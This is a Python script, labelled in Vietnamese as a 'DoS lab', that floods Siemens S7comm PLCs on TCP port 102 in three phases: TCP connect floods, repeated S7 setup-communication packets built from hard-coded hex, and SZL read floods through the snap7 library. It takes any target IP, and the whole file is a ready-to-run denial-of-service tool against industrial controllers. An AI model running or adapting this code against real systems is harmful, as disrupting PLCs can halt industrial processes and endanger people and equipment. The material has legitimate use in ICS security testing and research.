#!/usr/bin/env python3
"""DoS lab trên S7comm (TCP/102): setup_flood → tcp_connect → szl_flood."""

from __future__ import annotations

import socket
import sys
import threading
import time
from typing import Callable

PORT = 102
RACK, SLOT = 0, 2
DURATION = 10.0
PAUSE = 8.0

SETUP_PDU = bytes.fromhex(
    "0300002402f0803201000005000014"
    "0000f00000010200c0010a02000c0101"
)

PHASES: tuple[tuple[str, int], ...] = (
    ("setup_flood", 4),
    ("tcp_connect", 6),
    ("szl_flood", 2),
)


class Stats:
    def __init__(self) -> None:
        self.ok = 0
        self.errors = 0
        self.lock = threading.Lock()

    def inc_ok(self) -> None:
        with self.lock:
            self.ok += 1

    def inc_err(self) -> None:
        with self.lock:
            self.errors += 1


def tcp_connect_once(host: str) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, PORT))
    finally:
        s.close()


def setup_once(host: str) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, PORT))
        s.sendall(SETUP_PDU)
        try:
            s.recv(4096)
        except OSError:
            pass
    finally:
        s.close()


def worker_loop(stop: threading.Event, stats: Stats, fn: Callable[[], None]) -> None:
    while not stop.is_set():
        try:
            fn()
            stats.inc_ok()
        except Exception:
            stats.inc_err()


def run_flood(fn: Callable[[], None], workers: int, duration: float) -> Stats:
    stats = Stats()
    stop = threading.Event()
    threads = [
        threading.Thread(target=worker_loop, args=(stop, stats, fn), daemon=True)
        for _ in range(workers)
    ]
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=2)
    return stats


def run_szl_flood(host: str, workers: int, duration: float) -> Stats:
    import snap7

    stats = Stats()
    stop = threading.Event()

    def szl_worker() -> None:
        plc = snap7.client.Client()
        while not stop.is_set():
            try:
                if not plc.get_connected():
                    plc.connect(host, RACK, SLOT)
                plc.read_szl(0x0011, 0x0000)
                stats.inc_ok()
            except Exception:
                stats.inc_err()
                try:
                    plc.disconnect()
                except Exception:
                    pass
                time.sleep(0.05)
        try:
            plc.disconnect()
        except Exception:
            pass

    threads = [threading.Thread(target=szl_worker, daemon=True) for _ in range(workers)]
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=3)
    return stats


def run_phase(mode: str, host: str, workers: int) -> Stats:
    if mode == "tcp_connect":
        return run_flood(lambda: tcp_connect_once(host), workers, DURATION)
    if mode == "setup_flood":
        return run_flood(lambda: setup_once(host), workers, DURATION)
    if mode == "szl_flood":
        return run_szl_flood(host, workers, DURATION)
    raise ValueError(mode)


def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <ip>", file=sys.stderr)
        sys.exit(1)

    host = sys.argv[1]
    print(f"Target: {host}:{PORT}")

    for idx, (mode, workers) in enumerate(PHASES):
        print(f"--- {mode} (workers={workers}) ---")
        t0 = time.monotonic()
        stats = run_phase(mode, host, workers)
        elapsed = time.monotonic() - t0
        print(f"  ok={stats.ok} err={stats.errors} ({elapsed:.1f}s)")
        if idx < len(PHASES) - 1:
            time.sleep(PAUSE)

    print("[+] Done")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted.", file=sys.stderr)
        sys.exit(130)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(2)
